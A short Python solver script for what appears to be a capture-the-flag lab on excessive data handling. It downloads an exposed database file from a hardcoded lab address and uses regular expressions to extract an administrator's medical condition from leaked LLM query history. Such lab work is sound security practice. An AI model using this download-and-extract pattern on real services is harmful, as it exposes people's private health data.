#!/usr/bin/env python3
import argparse
import re
from typing import Optional

import requests


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Solve the excessive data handling lab by downloading the exposed "
            "database dump and extracting the leaked administrator condition."
        )
    )
    parser.add_argument(
        "--base-url",
        default="http://154.57.164.74:30126",
        help="Target base URL (default: http://154.57.164.74:30126)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=8,
        help="HTTP timeout in seconds (default: 8)",
    )
    return parser.parse_args()


def extract_condition(dump_text: str) -> Optional[str]:
    patterns = [
        r'suffer from \\"([^"\\]+)\\"',
        r'suffer from "([^"\\]+)"',
        r'suffer from ([A-Za-z][A-Za-z\- ]+?(?:Syndrome|Disorder|Condition))',
    ]

    for pattern in patterns:
        matches = re.findall(pattern, dump_text, flags=re.IGNORECASE)
        if matches:
            # Return the first likely condition from leaked llm query history.
            return matches[0].strip()

    return None


def main() -> None:
    args = parse_args()
    base_url = args.base_url.rstrip("/")
    dump_url = f"{base_url}/database.db"

    response = requests.get(dump_url, timeout=args.timeout)
    response.raise_for_status()
    dump_text = response.text

    condition = extract_condition(dump_text)
    if not condition:
        raise SystemExit("[!] Could not find a condition in /database.db.")

    print(f"[+] Administrator condition: {condition}")


if __name__ == "__main__":
    main()